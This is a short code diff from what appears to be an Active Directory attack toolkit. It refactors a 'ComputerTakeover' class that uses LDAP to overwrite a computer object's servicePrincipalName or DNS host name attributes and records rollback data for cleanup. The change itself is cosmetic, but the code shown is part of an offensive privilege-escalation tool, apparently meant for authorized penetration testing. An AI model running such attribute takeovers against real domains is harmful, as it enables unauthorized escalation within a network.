@@ -5,7 +5,7 @@ from __future__ import annotations
 import json
 from typing import Any
 
-from ldap3 import SUBTREE
+from ldap3 import MODIFY_REPLACE, SUBTREE
 
 from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
 from adaf_attack.core.graph import AttackGraph
@@ -46,10 +46,10 @@ class ComputerTakeover:
                 raise RuntimeError("Computer target not found")
             entry = conn.entries[0]
             old = [str(item) for item in (entry[attribute].value or [])] if entry[attribute] else []
-            from ldap3 import MODIFY_REPLACE
             ok = conn.modify(str(entry.distinguishedName), {attribute: [(MODIFY_REPLACE, [value])]})
             change = {"target": str(entry.distinguishedName), "attribute": attribute, "ok": bool(ok)}
-            if ok: session.register_cleanup({"kind": "computer-identity", "target": str(entry.distinguishedName), "attribute": attribute, "previous": old, "rollback": "Restore the recorded attribute value."})
+            if ok:
+                session.register_cleanup({"kind": "computer-identity", "target": str(entry.distinguishedName), "attribute": attribute, "previous": old, "rollback": "Restore the recorded attribute value."})
         conn.unbind()
         result = {"domain": target.domain, "identity_attributes": ["servicePrincipalName", "dNSHostName", "msDS-AdditionalDnsHostName"], "hits": hits, "count": len(hits), "change": change}
         session.path("computer-takeover.json").write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
